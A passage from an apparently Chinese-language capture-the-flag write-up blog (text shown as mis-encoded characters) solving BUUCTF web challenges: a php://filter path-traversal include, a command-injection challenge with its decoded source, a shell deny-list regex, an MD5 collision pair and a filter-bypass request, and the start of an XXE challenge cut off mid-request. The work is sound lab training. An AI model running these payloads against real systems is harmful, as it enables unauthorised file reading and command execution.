class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || strpos( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || strpos( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br><span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° å¿…é¡»æ˜¯ woofers meowers æˆ–è€… index</p><p>é‚£å°±æ˜¯è¦æ„å»ºä¸€ä¸ªpayloadï¼Œæœ‰ä¸Šé¢ä¸‰è€…å…¶ä¸€ä½†æ˜¯å®é™…å¤„ç†çš„flag</p><p>æ„é€   ç†ç”±å’ŒBUUç¬¬ä¸€é¡µé‚£ä¸ªç›®å½•ç©¿è¶Šä¸€æ · includeç¢°åˆ°äº† /äºæ˜¯å¤„ç†æœ€åä¸€é¡¹å†…å®¹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=index<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure><h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>æ ¹æ®åœ°å€æ çš„æç¤º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://5b8e822a-6993-43bd-8785-06dcc8b2d92d.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=<br></code></pre></td></tr></table></figure><p>æ¨æµ‹å‡º imgå‚æ•°çš„åŠ å¯†é¡ºåº str =&gt; hex =&gt; base64(hex) =&gt; base64(base64(hex))</p><p>ç”±æ­¤ï¼Œindex.php =&gt; TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p><p>è¿™æ—¶ä¼ å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://5b8e822a-6993-43bd-8785-06dcc8b2d92d.node4.buuoj.cn:81/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=<br></code></pre></td></tr></table></figure><p>å‘ç°æœ‰ä¸ªè£‚å›¾ï¼Œè£‚ä¸è£‚æ— æ‰€è°“ä¸»è¦æ•°æ®å¸¦å‡ºæ¥å°±è¡Œ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;data:image/gif;base64,PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMIHx8IH4gRV9OT1RJQ0UpOwpoZWFkZXIoJ2NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOwokY21kID0gJF9HRVRbJ2NtZCddOwppZiAoIWlzc2V0KCRfR0VUWydpbWcnXSkgfHwgIWlzc2V0KCRfR0VUWydjbWQnXSkpIAogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2ltZz1UWHBWZWs1VVRURk5iVlV6VFVSYWJFNXFZejAmY21kPScpOwokZmlsZSA9IGhleDJiaW4oYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRfR0VUWydpbWcnXSkpKTsKCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwgIiIsICRmaWxlKTsKaWYgKHByZWdfbWF0Y2goIi9mbGFnL2kiLCAkZmlsZSkpIHsKICAgIGVjaG8gJzxpbWcgc3JjID0iLi9jdGYzLmpwZWciPic7CiAgICBkaWUoInhpeGnvvZ4gbm8gZmxhZyIpOwp9IGVsc2UgewogICAgJHR4dCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKTsKICAgIGVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIiAuICR0eHQgLiAiJz48L2ltZz4iOwogICAgZWNobyAiPGJyPiI7Cn0KZWNobyAkY21kOwplY2hvICI8YnI+IjsKaWYgKHByZWdfbWF0Y2goIi9sc3xiYXNofHRhY3xubHxtb3JlfGxlc3N8aGVhZHx3Z2V0fHRhaWx8dml8Y2F0fG9kfGdyZXB8c2VkfGJ6bW9yZXxiemxlc3N8cGNyZXxwYXN0ZXxkaWZmfGZpbGV8ZWNob3xzaHxcJ3xcInxcYHw7fCx8XCp8XD98XFx8XFxcXHxcbnxcdHxccnxceEEwfFx7fFx9fFwofFwpfFwmW15cZF18QHxcfHxcXCR8XFt8XF18e3x9fFwofFwpfC18PHw+L2kiLCAkY21kKSkgewogICAgZWNobygiZm9yYmlkIH4iKTsKICAgIGVjaG8gIjxicj4iOwp9IGVsc2UgewogICAgaWYgKChzdHJpbmcpJF9QT1NUWydhJ10gIT09IChzdHJpbmcpJF9QT1NUWydiJ10gJiYgbWQ1KCRfUE9TVFsnYSddKSA9PT0gbWQ1KCRfUE9TVFsnYiddKSkgewogICAgICAgIGVjaG8gYCRjbWRgOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICgibWQ1IGlzIGZ1bm55IH4iKTsKICAgIH0KfQoKPz4KPGh0bWw+CjxzdHlsZT4KICBib2R5ewogICBiYWNrZ3JvdW5kOnVybCguL2JqLnBuZykgIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyOwogICBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7CiAgIGJhY2tncm91bmQtYXR0YWNobWVudDpmaXhlZDsKICAgYmFja2dyb3VuZC1jb2xvcjojQ0NDQ0NDOwp9Cjwvc3R5bGU+Cjxib2R5Pgo8L2JvZHk+CjwvaHRtbD4=&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>å°†è¿™æ®µå†…å®¹è§£å¯†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(E_ALL || ~ E_NOTICE);<br>header(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    header(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = preg_replace(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixiï½ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = base64_encode(file_get_contents(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç›®çš„æ˜¯æ‰§è¡Œåˆ°25è¡Œä»£ç æˆ‘ä»¬éœ€è¦æ»¡è¶³</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>...<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))  <br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªifç®€å•ï¼Œæ¨¡å¼æ¯”è¾ƒå•ä¸€    </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>&amp;b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure><p>é‚£ç¬¬ä¸€ä¸ªå‘¢</p><p>è¯´ä¸€ä¸‹éé¢„æœŸ sort æŸ¥çœ‹å†…å®¹</p><p>é¢„æœŸå‘¢</p><p>æ­£åˆ™åŒ¹é…ä¸­æœ‰ä¸€æ®µä»£ç æ˜¯è¿™æ ·çš„  <code>|\\|\\\\|</code> çœ‹çš„å‡ºæ¥ä½œè€…ä¼¼ä¹æƒ³åŒ¹é… <code>&#39;\&#39;å’Œ&#39;\\&#39; </code> ç„¶è€Œå®é™…ä¸Šæ­£åˆ™è¡¨è¾¾å¼æœ¬èº«è¿˜ä¼šåšä¸€æ¬¡å–è½¬ä¹‰ æ‰€ä»¥è¿™é‡Œå®é™…ä¸ŠåŒ¹é…çš„æ˜¯<code> &#39;|\&#39;</code></p><p>æµ‹è¯•ç»“æœ</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201131708725.png" alt="image-20220113170848618"></p><p>é‚£ä¹ˆå°±ç®€ç­”äº† ä¸Šé¢è¿‡æ»¤äº† ç©ºæ ¼ å’Œ catï¼Œcat /flag =&gt;ca\t%0a/flag</p><p>æœ€åæ•°æ®åŒ…å¦‚ä¸‹å³å¯getFlag</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php?cmd=ca\t%20/flag</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5b8e822a-6993-43bd-8785-06dcc8b2d92d.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>389<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5b8e822a-6993-43bd-8785-06dcc8b2d92d.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5b8e822a-6993-43bd-8785-06dcc8b2d92d.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ce3948a50a00-06fd4863146224-561a135a-144000-17ce3948a51bb6<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>&amp;b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span></span><br></code></pre></td></tr></table></figure><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>ä¸€çœ¼xxe</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/doLogin.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>6f0c91e5-36ac-4c72-af37-dc935433ad93.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>57<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/xml, text/xml, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml;charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://6f0c91e5-36ac-4c72-af37-dc935433ad93.node4.buuoj.cn:81<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://6f0c91e5-36ac-4c72-af37-dc935433ad93.node4.buuoj.cn:81/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ce3948a50a00-06fd4863146224-561a135a-144000-17ce3948a51bb6<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªæœ€ç®€å•çš„payloadå‡ºæ¥äº†</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/doLogin.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>6f0c91e5-36ac-4c72-af37-dc935433ad93.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>126<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/xml, text/xml, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml;charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://6f0c91e5-36ac-4c72-af37-dc935433ad93.node4.buuoj.cn:81<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://6f0c91e5-36ac-4c72-af37-dc935433ad93.node4.buuoj.cn:81/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: 